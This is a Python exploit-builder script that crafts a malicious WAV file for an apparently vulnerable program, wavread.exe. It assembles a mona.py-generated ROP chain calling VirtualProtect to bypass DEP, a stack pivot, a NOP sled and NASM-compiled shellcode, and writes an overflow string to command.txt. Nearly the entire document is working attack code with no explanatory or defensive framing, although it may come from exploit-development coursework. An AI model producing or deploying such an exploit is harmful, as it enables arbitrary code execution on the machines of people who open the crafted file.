import os
import sys
import struct

import subprocess

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00415ca7,  # POP EAX # POP EBP # RETN [wavread.exe] 
      0x00427008,  # ptr to &VirtualProtect() [IAT wavread.exe]
      0x41414141,  # Filler (compensate)
      0x0040170b,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [wavread.exe] 
      0x004123c7,  # POP ESI # RETN [wavread.exe] 
      0xffffffff,  #  
      0x00407c36,  # INC ESI # RETN [wavread.exe] 
      0x0040cff5,  # ADD ESI,EAX # INC ECX # ADD AL,0 # POP EDI # POP EBP # RETN [wavread.exe] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x0040c2ef,  # POP EBP # RETN [wavread.exe] 
      0x77597f75,  # & jmp esp [RPCRT4.dll] ** REBASED ** ASLR
      0x00413866,  # POP EBX # RETN [wavread.exe] 
      0x00000201,  # 0x00000201-> ebx
      0x0041d3cc,  # POP EDX # RETN [wavread.exe] 
      0x00000040,  # 0x00000040-> edx
      0x00414c82,  # POP ECX # RETN [wavread.exe] 
      0x00434d8d,  # &Writable location [wavread.exe]
      0x004186e8,  # POP EDI # RETN [wavread.exe] 
      0x00413707,  # RETN (ROP NOP) [wavread.exe]
      0x0041b058,  # POP EAX # POP EBP # RETN [wavread.exe] 
      0x90909090,  # nop
    #   0x41414141,  # Filler (compensate)
      0x0040170e,  # PUSHAD # RETN [wavread.exe] 
    ]

    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

##################### FILL MANDATORY FILE FIELDS ###########################

format = b"RIFF" # mandatory file field # ChunkID, identify the samples audio data in hi/lo format
format += bytes(struct.pack('<L', 0x01cc45d4)) # mandatory file field # ChunkSize: 01CC45D4=30,164,452 is the total size minus 8
format += b"WAVE" # mandatory file field # ChunkFormat, this format requires two subchunks to exist, "fmt " and "data"
format += b"fmt "  # mandatory file field # Subchunk1, this describes the format of the next DATA subchunk.

##################### BEGIN CREATION OF STACK PIVOT #####################

# begin creation of stack pivot
format += bytes(struct.pack('<L', 0x00412c24))  # POP EAX # POP EBP # RETN    ** [wavread.exe] SafeSEH **   |  startnull,asciiprint,ascii {PAGE_EXECUTE_READ}
format += bytes(struct.pack('<L', 0x00436030))  # address of shellcode + offset, DAT_00436000 + 0x30; hits padding @ 0x44444444
format += bytes(struct.pack('<L', 0x43434343))
format += bytes(struct.pack('<L', 0x0041fc22)) # XCHG EAX,ESP # RETN    ** [wavread.exe] **   |  startnull {PAGE_EXECUTE_READ}
format += bytes(struct.pack('<L', 0x00000010))

##################### MORE MANDATORY FILE FIELDS #####################

format += b"data" # mandatory file field # Subchunk2, this chunk contains the audio samples. There can be more than one in a WAV file.
format += bytes(struct.pack('<L', 0x01cc45b0)) # mandatory file field # ChunkSize: 01CC45D4=30,164,452 is the total size minus 8
padding = bytes(struct.pack('<L', 0x44444444))

#####################   CREATE ROP CHAIN     #########################

rop_chain = create_rop_chain()

##################### NOP SLED + SHELLCODE OFFSET #####################

nops = b"\x90" * 12
nops = bytes(struct.pack('<L', 0x00436090))

#####################   COMPILE SHELLCODE   ###########################

cmd = '"C:\\Program Files\\NASM\\nasm.exe" "'+os.getcwd()+'\\micah.asm"'
status = subprocess.call(cmd, shell=True)

##################### CONVERT SHELLCODE TO BYTES ######################

bin = "micah"
shellcode = b""

with open(bin, 'rb') as f:
    shellcode = f.read()

shellcode = b"\x90\xBC\xEC\xCD\x18\x00" + shellcode # NOP pad + stack offset

##################### OUTPUT EXPLOIT AS .WAV #####################

payload = format + padding + rop_chain + nops + shellcode

binary_file = open("exploit.wav", "wb")
binary_file.write(payload)
binary_file.close()

##################### COMMAND PIVOT TO FILE #####################

command = b"\x42" * 408
command += bytes(struct.pack('<L', 0x0042661e)) # stack pivot +16
command_file = open("command.txt", "wb")
command_file.write(command)
command_file.close()